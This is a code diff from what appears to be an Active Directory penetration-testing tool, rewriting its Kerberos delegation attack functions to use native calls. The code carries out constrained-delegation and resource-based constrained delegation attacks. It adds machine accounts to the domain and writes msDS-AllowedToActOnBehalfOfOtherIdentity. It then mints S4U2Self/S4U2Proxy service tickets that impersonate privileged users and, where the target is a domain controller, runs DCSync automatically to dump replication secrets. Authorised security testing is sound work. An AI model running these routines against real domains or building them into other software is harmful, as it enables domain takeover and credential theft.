+                    notes={"target_host": target_host, "impersonated": target_user},
+                )
+            except Exception as exc:
+                telemetry.capture_exception(exc)
+        try:
+            telemetry.capture(
+                "delegation_exploitation_success",
+                {
                     "delegation_type": "constrained_protocol_transition",
-                    "ticket_obtained": ccache_file is not None,
+                    "ticket_obtained": result.ticket_path is not None,
                     "target_is_dc": shell.is_computer_dc(domain, target_host),
                     "scan_mode": getattr(shell, "scan_mode", None),
                     "auth_type": shell.domains_data[domain].get("auth", "unknown"),
                     "workspace_type": shell.type,
                     "auto_mode": shell.auto,
-                }
-                properties.update(
-                    build_lab_event_fields(shell=shell, include_slug=True)
-                )
-                telemetry.capture("delegation_exploitation_success", properties)
-            except Exception as e:
-                telemetry.capture_exception(e)
-
-            # Check if the host is a Domain Controller.
-            # Returns True if identified as DC.
-            if shell.is_computer_dc(domain, target_host):
-                marked_target_host = mark_sensitive(target_host, "hostname")
-                print_warning(
-                    f"{marked_target_host} identified as Domain Controller. Proceeding with DCSync."
-                )
-                if ccache_file:
-                    # Call dcsync passing the .ccache file path instead of the password
-                    shell.dcsync(domain, target_user, ccache_file)
-            else:
-                marked_target_host = mark_sensitive(target_host, "hostname")
-                print_warning(
-                    f"{marked_target_host} is not identified as a Domain Controller. DCSync will not be invoked."
-                )
+                },
+            )
+        except Exception as e:
+            telemetry.capture_exception(e)
+        if result.ticket_path:
+            _persist_service_ticket_after_s4u(
+                shell,
+                domain=domain,
+                ccache_path=result.ticket_path,
+                kind="constrained_delegation",
+                owner_principal=owner_principal,
+                impersonated_user=target_user,
+                spn=service_spn,
+                target_host=target_host,
+            )
+            target_is_dc = shell.is_computer_dc(domain, target_host)
+            next_hint = (
+                "Run DCSync with this ticket to dump replication secrets."
+                if target_is_dc
+                else f"Use the ticket against {target_host} with the allowed SPN."
+            )
+            _print_s4u_success_panel(
+                delegation_kind="constrained",
+                marked_impersonated=mark_sensitive(target_user, "user"),
+                marked_target=mark_sensitive(service_spn or target_host, "service"),
+                marked_ticket_path=mark_sensitive(result.ticket_path, "path"),
+                next_hint=next_hint,
+            )
+            if target_is_dc:
+                shell.dcsync(domain, target_user, result.ticket_path)
         else:
-            if hasattr(shell, "_update_active_attack_graph_step_status"):
-                try:
-                    shell._update_active_attack_graph_step_status(  # type: ignore[attr-defined]
-                        domain=domain,
-                        status="failed",
-                        notes={
-                            "target_host": target_host,
-                            "impersonated": target_user,
-                        },
-                    )
-                except Exception as exc:
-                    telemetry.capture_exception(exc)
-
-            # Telemetry: track failed delegation exploitation
+            # Native call returned success but no ticket was produced; this is
+            # rare but not impossible (in-memory cache only). Keep the legacy
+            # one-liner so the audit log carries a marker.
+            print_success(f"Command executed successfully on {marked_target_host}.")
+    else:
+        if hasattr(shell, "_update_active_attack_graph_step_status"):
             try:
-                properties = {
-                    "delegation_type": "constrained_protocol_transition",
-                    "scan_mode": getattr(shell, "scan_mode", None),
-                    "auth_type": shell.domains_data[domain].get("auth", "unknown"),
-                    "workspace_type": shell.type,
-                    "auto_mode": shell.auto,
-                }
-                properties.update(
-                    build_lab_event_fields(shell=shell, include_slug=True)
+                shell._update_active_attack_graph_step_status(  # type: ignore[attr-defined]
+                    domain=domain,
+                    status="failed",
+                    notes={"target_host": target_host, "impersonated": target_user},
                 )
-                telemetry.capture("delegation_exploitation_failed", properties)
-            except Exception as e:
-                telemetry.capture_exception(e)
+            except Exception as exc:
+                telemetry.capture_exception(exc)
+        error_message = str(result.error_message or "unknown error")
+        hint = _map_delegation_failure_hint(error_message)
+        print_panel(
+            (
+                f"[bold {COLOR_CRIMSON}]✗ Constrained delegation failed[/bold {COLOR_CRIMSON}]\n\n"
+                f"[bold]Reason:[/bold] {error_message}\n"
+                f"[bold]Hint:[/bold]   {hint}"
+            ),
+            title=f"[bold {COLOR_CRIMSON}]Delegation failed[/bold {COLOR_CRIMSON}]",
+            border_style=COLOR_CRIMSON,
+            expand=False,
+        )
 
-            error_msg = (
-                (result.stderr or "").strip()
-                if result.stderr
-                else (result.stdout or "").strip()
-            )
-            marked_target_host = mark_sensitive(target_host, "hostname")
-            print_error(
-                f"Error executing command on {marked_target_host}: {error_msg if error_msg else 'Details not available'}"
-            )
-    except Exception as e:
-        telemetry.capture_exception(e)
-        marked_target_host = mark_sensitive(target_host, "hostname")
-        print_error(f"Exception in execute_constrained for {marked_target_host}.")
-        print_exception(show_locals=False, exception=e)
 
 
 def exploit_delegation_rbcd(
@@ -870,7 +637,7 @@ def exploit_delegation_rbcd(
 
             marked_username = mark_sensitive(username, "user")
             print_success(
-                f"Starting constrained delegation exploitation for {marked_username}"
+                f"Starting RBCD exploitation as {marked_username}"
             )
 
             # Step 1: Create new computer
@@ -969,8 +736,6 @@ def add_computer_to_domain(
     password: str,
 ) -> bool:
     """Adds a new computer to the domain."""
-    from adscan_internal.services.exploitation import ExploitationService
-
     try:
         if domain not in shell.domains:
             marked_target_domain = mark_sensitive(domain, "domain")
@@ -979,49 +744,69 @@ def add_computer_to_domain(
             )
             return None
 
-        if not shell.impacket_scripts_dir:
-            print_error(
-                "Impacket scripts directory not configured. Please ensure Impacket is installed via 'adscan install'."
-            )
-            return None
-
-        getaddcomputer_py_path = os.path.join(
-            shell.impacket_scripts_dir, "addcomputer.py"
-        )
-        if not os.path.isfile(getaddcomputer_py_path) or not os.access(
-            getaddcomputer_py_path, os.X_OK
-        ):
-            print_error(
-                f"addcomputer.py not found or not executable in {shell.impacket_scripts_dir}. Please check Impacket installation."
-            )
-            return None
-        auth = shell.build_auth_impacket_no_host(username, password, domain)
-        command = f"{getaddcomputer_py_path} -computer-name '{computer_name}$' -computer-pass '{computer_pass}' "
-        command += f"-dc-host {shell.domains_data[domain]['pdc']} "
-        command += f"{auth}"
-
-        print_success("Adding computer to the domain")
-        service = ExploitationService()
-        outcome = service.delegation.run_addcomputer_command(
-            command=command,
-            timeout=300,
-            impacket_context=_build_impacket_context(shell),
-            kerberos_retry_context=_build_impacket_kerberos_retry_context(
-                shell,
-                domain=domain,
-                username=username,
-                credential=password,
-            ),
+        inventory = _load_ip_hostname_inventory(shell, domain)
+        outcome = _run_addcomputer_native(
+            domain=domain,
+            domains_data=shell.domains_data,
+            ip_hostname_inventory=inventory,
+            username=username,
+            password=password,
+            computer_name=computer_name,
+            computer_password=computer_pass,
         )
 
         if outcome.success:
-            clear_machine_account_quota_exhausted(
+            record_machine_account_creation_result(
                 shell,
                 domain=domain,
-                username=username,
+                actor_username=username,
+                success=True,
             )
             print_success(f"Computer {computer_name}$ added successfully")
             machine_account = normalize_machine_account(computer_name)
+            register_managed_machine_account(
+                shell,
+                domain=domain,
+                sam_account_name=machine_account,
+                password=computer_pass,
+                created_by=username,
+                source="authenticated_ldap",
+            )
+            # Inject the new machine account's primary-group membership into
+            # the workspace snapshot.  Windows assigns primaryGroupID=515
+            # (Domain Computers) automatically when SamrCreateUser2InDomain
+            # is called with USER_WORKSTATION_TRUST_ACCOUNT, known by
+            # construction, no LDAP roundtrip needed.  Without this, every
+            # subsequent attack-path render falls back to LDAP queries that
+            # return 0 results (computer primaryGroupID is not in the LDAP
+            # ``member`` attribute the IN_CHAIN matching rule traverses).
+            try:
+                from adscan_internal.services.membership_snapshot import (  # noqa: PLC0415
+                    add_runtime_computer_group_membership,
+                )
+                add_runtime_computer_group_membership(
+                    shell,
+                    domain,
+                    computer_name=machine_account,
+                    group_rid=515,
+                    source="adscan_addcomputer_native",
+                    evidence={
+                        "primary_group_rid": 515,
+                        "creation_method": "samr_create_user2",
+                        "actor_username": username,
+                    },
+                    origin_kind="machine_account_creation",
+                    origin_technique="addcomputer_samr",
+                    origin_relation="AddComputer",
+                    cleanup_behavior="remove_directory_and_runtime",
+                )
+            except Exception as exc:  # noqa: BLE001
+                telemetry.capture_exception(exc)
+                marked_machine = mark_sensitive(machine_account, "user")
+                print_info_debug(
+                    "[delegations] failed to inject primary-group membership for "
+                    f"{marked_machine}: {type(exc).__name__}: {exc}"
+                )
             try:
                 shell.add_credential(
                     domain,
@@ -1043,10 +828,12 @@ def add_computer_to_domain(
                 )
             return True
         if outcome.quota_exceeded:
-            mark_machine_account_quota_exhausted(
+            record_machine_account_creation_result(
                 shell,
                 domain=domain,
-                username=username,
+                actor_username=username,
+                success=False,
+                quota_exceeded=True,
                 reason=outcome.output or "MachineAccountQuota exceeded for actor.",
             )
             marked_user = mark_sensitive(username, "user")
@@ -1065,6 +852,35 @@ def add_computer_to_domain(
         return False
 
 
+def _load_ip_hostname_inventory(shell, domain: str) -> dict | None:
+    """Load the workspace IP->hostname inventory for one domain, if available."""
+    workspace_dir = getattr(shell, "current_workspace_dir", None) or ""
+    domains_dir = getattr(shell, "domains_dir", None) or ""
+    if not workspace_dir or not domains_dir:
+        return None
+    try:
+        from adscan_internal.services.kerberos_hostname_inventory import (  # noqa: PLC0415
+            load_workspace_ip_hostname_inventory,
+        )
+
+        return load_workspace_ip_hostname_inventory(
+            workspace_dir=workspace_dir,
+            domains_dir=domains_dir,
+            domain=domain,
+        )
+    except Exception:
+        return None
+
+
+def _run_addcomputer_native(**kwargs):
+    """Deferred native add-computer wrapper to keep CLI tests patchable."""
+    from adscan_internal.services.exploitation.delegation_native import (  # noqa: PLC0415
+        run_addcomputer_native,
+    )
+
+    return run_addcomputer_native(**kwargs)
+
+
 def set_rbcd_delegation(
     shell: DelegationShell,
     domain: str,
@@ -1075,34 +891,21 @@ def set_rbcd_delegation(
     password: str,
 ) -> bool:
     """Configures RBCD for the created computer."""
-    from adscan_internal.services.exploitation import ExploitationService
-
     try:
         _ = computer_pass  # reserved for future reuse/cleanup flows
-        auth = shell.build_auth_impacket_no_host(username, password, domain)
-        service = ExploitationService()
-        build_result = service.delegation.build_rbcd_write_command(
-            impacket_scripts_dir=shell.impacket_scripts_dir,
-            delegate_from=computer_name,
-            delegate_to=target,
-            dc_ip=shell.domains_data[domain]["pdc"],
-            auth=auth,
+        from adscan_internal.services.exploitation.delegation_native import (
+            run_rbcd_write_native,
         )
-        if not build_result.success or not build_result.command:
-            print_error(str(build_result.error_message or "Error configuring RBCD."))
-            return False
 
-        print_success("Configuring RBCD")
-        outcome = service.delegation.run_rbcd_command(
-            command=build_result.command,
-            timeout=300,
-            impacket_context=_build_impacket_context(shell),
-            kerberos_retry_context=_build_impacket_kerberos_retry_context(
-                shell,
-                domain=domain,
-                username=username,
-                credential=password,
-            ),
+        inventory = _load_ip_hostname_inventory(shell, domain)
+        outcome = run_rbcd_write_native(
+            domain=domain,
+            domains_data=shell.domains_data,
+            ip_hostname_inventory=inventory,
+            username=username,
+            password=password,
+            target_computer=target,
+            actor_computer=computer_name,
         )
 
         if outcome.success:
@@ -1112,10 +915,39 @@ def set_rbcd_delegation(
                     "the delegation privileges needed for this target (no changes were required)."
                 )
             else:
-                print_success("RBCD configured successfully")
+                # Verdict-first panel with the exact attribute write and the
+                # Next move, matching the backup_operators_escalation pattern.
+                marked_actor = mark_sensitive(computer_name, "user")
+                marked_target = mark_sensitive(target, "hostname")
+                print_panel(
+                    (
+                        f"[bold {COLOR_SAGE}]✓ RBCD configured[/bold {COLOR_SAGE}]\n\n"
+                        f"[bold]Target computer:[/bold]  {marked_target}\n"
+                        f"[bold]Actor account:[/bold]    {marked_actor}\n"
+                        f"[bold]Attribute write:[/bold]  "
+                        f"msDS-AllowedToActOnBehalfOfOtherIdentity\n\n"
+                        f"[bold]Next:[/bold] S4U2Self + S4U2Proxy with the "
+                        f"actor account to mint a service ticket as a "
+                        f"privileged user."
+                    ),
+                    title=f"[bold {COLOR_SAGE}]RBCD setup[/bold {COLOR_SAGE}]",
+                    border_style=COLOR_SAGE,
+                    expand=False,
+                )
             return True
 
-        print_error("Error configuring RBCD. Check logs for details.")
+        hint = _map_delegation_failure_hint("")
+        print_panel(
+            (
+                f"[bold {COLOR_CRIMSON}]✗ RBCD configuration failed[/bold {COLOR_CRIMSON}]\n\n"
+                f"[bold]Reason:[/bold] could not write "
+                f"msDS-AllowedToActOnBehalfOfOtherIdentity on the target.\n"
+                f"[bold]Hint:[/bold]   {hint}"
+            ),
+            title=f"[bold {COLOR_CRIMSON}]RBCD failed[/bold {COLOR_CRIMSON}]",
+            border_style=COLOR_CRIMSON,
+            expand=False,
+        )
         return False
 
     except Exception as e:
@@ -1149,15 +981,8 @@ def create_forwardable_ticket(
         if isinstance(s4u_account, str) and s4u_account.endswith("$"):
             s4u_account = s4u_account.rstrip("$")
 
-        if not shell.impacket_scripts_dir:
-            print_error(
-                "Impacket scripts directory not configured. Please ensure Impacket is installed via 'adscan install'."
-            )
-            return False
-
         service = KerberosTicketService()
-        result = service.create_forwardable_ticket(
-            impacket_scripts_dir=shell.impacket_scripts_dir,
+        result = service.create_forwardable_ticket_native(
             domain=domain,
             pdc_hostname=shell.domains_data[domain]["pdc_hostname"],
             pdc_ip=shell.domains_data[domain]["pdc"],
@@ -1194,12 +1019,10 @@ def launch_s4proxy(
     *,
     prompt_for_dcsync_followup: bool = True,
 ) -> bool:
-    """Launch the S4Proxy attack with the forwardable ticket."""
-    from adscan_internal.services.exploitation import ExploitationService
+    """Launch the S4Proxy attack: native kerbad path first, getST.py fallback."""
 
     setattr(shell, "_last_delegation_launch_result", None)
     try:
-        # Get a privileged user that can be delegated
         target_user = shell.get_delegatable_privileged_user(domain)
         if not target_user:
             setattr(
@@ -1216,86 +1039,75 @@ def launch_s4proxy(
             print_error("No privileged user found that can be delegated")
             return False
 
-        auth = shell.build_auth_impacket_no_host(username, password, domain)
-        service = ExploitationService()
-        additional_ticket = (
-            f"{target_user}@browser_{shell.domains_data[domain]['pdc_hostname']}"
-            f".{domain}@{domain.upper()}.ccache"
+        ccache_path = os.path.join(
+            shell._get_workspace_cwd(),
+            f"{target_user}@{target}.{domain.upper()}.ccache",
         )
-        build_result = service.delegation.build_s4proxy_command(
-            impacket_scripts_dir=shell.impacket_scripts_dir,
-            target_user=target_user,
-            target_spn=target,
-            additional_ticket=additional_ticket,
-            dc_ip=shell.domains_data[domain]["pdc"],
-            auth=auth,
+        native = _run_s4u_native(
+            shell,
+            domain=domain,
+            username=username,
+            password=password,
+            impersonate_user=target_user,
+            service_spn=target,
+            ccache_output_path=ccache_path,
         )
-        if not build_result.success or not build_result.command:
-            setattr(
-                shell,
-                "_last_delegation_launch_result",
-                {
-                    "success": False,
-                    "target_spn": target,
-                    "target_user": target_user,
-                    "ticket_path": None,
-                    "error": str(
-                        build_result.error_message or "Error executing S4Proxy."
-                    ),
-                },
-            )
-            print_error(str(build_result.error_message or "Error executing S4Proxy."))
-            return False
-
-        print_success("Launching S4Proxy")
-        result = service.delegation.run_service_ticket_command(
-            command=build_result.command,
-            timeout=300,
-            impacket_context=_build_impacket_context(shell),
-            kerberos_retry_context=_build_impacket_kerberos_retry_context(
-                shell,
-                domain=domain,
-                username=username,
-                credential=password,
-            ),
-        )
-
-        if result.success:
-            ticket = result.ticket_path
-            setattr(
-                shell,
-                "_last_delegation_launch_result",
-                {
-                    "success": True,
-                    "target_spn": target,
-                    "target_user": target_user,
-                    "ticket_path": ticket,
-                },
-            )
-
-            print_success("S4Proxy executed successfully")
-            if ticket and prompt_for_dcsync_followup:
-                shell.ask_for_dcsync(domain, target_user, ticket)
-            elif not ticket:
-                print_warning(
-                    "S4Proxy completed but could not parse ticket path from output."
-                )
-            return True
-
+        ticket = native.ticket_path if native.success else None
         setattr(
             shell,
             "_last_delegation_launch_result",
             {
-                "success": False,
+                "success": native.success,
                 "target_spn": target,
                 "target_user": target_user,
-                "ticket_path": None,
-                "error": str(result.error_message or "").strip()
-                or "S4Proxy execution failed",
+                "ticket_path": ticket,
+                "error": native.error_message if not native.success else None,
             },
         )
-        print_error(
-            f"Error executing S4Proxy: {result.error_message or 'unknown error'}"
+        if native.success:
+            if ticket:
+                target_host_part = (
+                    target.split("/", 1)[1] if "/" in target else target
+                )
+                _persist_service_ticket_after_s4u(
+                    shell,
+                    domain=domain,
+                    ccache_path=ticket,
+                    kind="rbcd",
+                    owner_principal=username,
+                    impersonated_user=target_user,
+                    spn=target,
+                    target_host=target_host_part,
+                )
+                target_is_dc = shell.is_computer_dc(domain, target_host_part)
+                next_hint = (
+                    "Run DCSync with this ticket to dump replication secrets."
+                    if target_is_dc
+                    else "Use the ticket against the target SPN for lateral movement."
+                )
+                _print_s4u_success_panel(
+                    delegation_kind="rbcd",
+                    marked_impersonated=mark_sensitive(target_user, "user"),
+                    marked_target=mark_sensitive(target, "service"),
+                    marked_ticket_path=mark_sensitive(ticket, "path"),
+                    next_hint=next_hint,
+                )
+            else:
+                print_success("S4Proxy executed successfully")
+            if ticket and prompt_for_dcsync_followup:
+                shell.ask_for_dcsync(domain, target_user, ticket)
+            return True
+        error_message = str(native.error_message or "unknown error")
+        hint = _map_delegation_failure_hint(error_message)
+        print_panel(
+            (
+                f"[bold {COLOR_CRIMSON}]✗ S4Proxy failed[/bold {COLOR_CRIMSON}]\n\n"
+                f"[bold]Reason:[/bold] {error_message}\n"
+                f"[bold]Hint:[/bold]   {hint}"
+            ),
+            title=f"[bold {COLOR_CRIMSON}]Delegation failed[/bold {COLOR_CRIMSON}]",
+            border_style=COLOR_CRIMSON,
+            expand=False,
         )
         return False
 
@@ -1332,7 +1144,6 @@ def request_delegated_service_ticket(
     legacy S4Proxy wrapper, it does not depend on an intermediate browser/DC
     ccache and instead asks Impacket directly for the final service ticket.
     """
-    from adscan_internal.services.exploitation import ExploitationService
 
     previous_result = getattr(shell, "_last_delegation_launch_result", None)
     aggregated_ticket_paths: dict[str, str] = {}
@@ -1376,70 +1187,45 @@ def request_delegated_service_ticket(
             print_error("No privileged user found that can be delegated")
             return False
 
-        auth = shell.build_auth_impacket_no_host(username, password, domain)
-        service = ExploitationService()
-        build_result = service.delegation.build_service_ticket_command(
-            impacket_scripts_dir=shell.impacket_scripts_dir,
-            target_user=target_user,
-            target_spn=target_spn,
-            auth=auth,
-            dc_ip=shell.domains_data[domain]["pdc"],
-            force_forwardable=force_forwardable,
-        )
-        if not build_result.success or not build_result.command:
-            error_message = str(
-                build_result.error_message or "Error requesting delegated service ticket."
-            )
-            setattr(
-                shell,
-                "_last_delegation_launch_result",
-                {
-                    "success": False,
-                    "target_spn": target_spn,
-                    "ticket_paths": aggregated_ticket_paths,
-                    "target_user": target_user,
-                    "ticket_path": None,
-                    "error": error_message,
-                },
-            )
-            print_error(error_message)
-            return False
-
         marked_spn = mark_sensitive(target_spn, "service")
-        print_success(
-            f"Requesting delegated service ticket for {marked_spn}"
+        print_success(f"Requesting delegated service ticket for {marked_spn}")
+
+        # Native kerbad S4U2Self+S4U2Proxy.
+        ccache_path = os.path.join(
+            shell._get_workspace_cwd(),
+            f"{target_user}@{target_spn.replace('/', '_')}.{domain.upper()}.ccache",
         )
-        result = service.delegation.run_service_ticket_command(
-            command=build_result.command,
-            timeout=300,
-            impacket_context=_build_impacket_context(shell),
-            kerberos_retry_context=_build_impacket_kerberos_retry_context(
-                shell,
-                domain=domain,
-                username=username,
-                credential=password,
-            ),
+        native = _run_s4u_native(
+            shell,
+            domain=domain,
+            username=username,
+            password=password,
+            impersonate_user=target_user,
+            service_spn=target_spn,
+            ccache_output_path=ccache_path,
         )
-        if result.success and result.ticket_path:
-            aggregated_ticket_paths[target_spn] = result.ticket_path
+        ticket = native.ticket_path if native.success else None
+        if ticket:
+            aggregated_ticket_paths[target_spn] = ticket
         setattr(
             shell,
             "_last_delegation_launch_result",
             {
-                "success": result.success,
+                "success": native.success,
                 "target_spn": target_spn,
                 "target_user": target_user,
-                "ticket_path": result.ticket_path,
+                "ticket_path": ticket,
                 "ticket_paths": aggregated_ticket_paths,
-                "error": result.error_message,
+                "error": native.error_message if not native.success else None,
             },
         )
-        if result.success:
+        if native.success:
             print_success("Delegated service ticket created successfully")
             return True
-
         print_error(
-            str(result.error_message or "Error requesting delegated service ticket.")
+            str(
+                native.error_message or "Error requesting delegated service ticket."
+            )
         )
         return False
 
@@ -1485,7 +1271,9 @@ def refresh_last_delegated_service_ticket(
     previous_ticket_path = None
     previous_ticket_paths: dict[str, str] = {}
     if isinstance(previous_result, dict):
-        previous_ticket_path = str(previous_result.get("ticket_path") or "").strip() or None
+        previous_ticket_path = (
+            str(previous_result.get("ticket_path") or "").strip() or None
+        )
         raw_ticket_paths = previous_result.get("ticket_paths")
         if isinstance(raw_ticket_paths, dict):
             previous_ticket_paths = {
@@ -1503,9 +1291,11 @@ def refresh_last_delegated_service_ticket(
     known_ticket_paths.update(
         os.path.abspath(path) for path in previous_ticket_paths.values() if path
     )
-    if requested_ticket_path and known_ticket_paths and os.path.abspath(
+    if (
         requested_ticket_path
-    ) not in known_ticket_paths:
+        and known_ticket_paths
+        and os.path.abspath(requested_ticket_path) not in known_ticket_paths
+    ):
         print_warning(
             "ADscan detected a delegated ticket mismatch and will not refresh "
             "an unrelated Kerberos cache automatically."
@@ -1516,7 +1306,9 @@ def refresh_last_delegated_service_ticket(
     target_spn = str(context.get("target_spn") or "").strip()
     raw_target_spns = context.get("target_spns")
     if isinstance(raw_target_spns, list):
-        target_spns = [str(item).strip() for item in raw_target_spns if str(item).strip()]
+        target_spns = [
+            str(item).strip() for item in raw_target_spns if str(item).strip()
+        ]
     else:
         target_spns = [target_spn] if target_spn else []
     username = str(context.get("username") or "").strip()
@@ -1532,10 +1324,7 @@ def refresh_last_delegated_service_ticket(
 
     for next_target_spn in target_spns:
         marked_spn = mark_sensitive(next_target_spn, "service")
-        print_info(
-            "Refreshing delegated service ticket for "
-            f"{marked_spn}."
-        )
+        print_info(f"Refreshing delegated service ticket for {marked_spn}.")
         success = request_delegated_service_ticket(
             shell,
             domain,
@@ -1554,11 +1343,15 @@ def refresh_last_delegated_service_ticket(
     if requested_ticket_path and isinstance(refreshed_ticket_paths, dict):
         previous_match = None
         for spn, prior_path in previous_ticket_paths.items():
-            if os.path.abspath(str(prior_path)) == os.path.abspath(requested_ticket_path):
+            if os.path.abspath(str(prior_path)) == os.path.abspath(
+                requested_ticket_path
+            ):
                 previous_match = str(spn).strip()
                 break
         if previous_match:
-            refreshed_match = str(refreshed_ticket_paths.get(previous_match) or "").strip()
+            refreshed_match = str(
+                refreshed_ticket_paths.get(previous_match) or ""
+            ).strip()
             if refreshed_match:
                 return refreshed_match
     return str(refreshed_result.get("ticket_path") or "").strip() or None
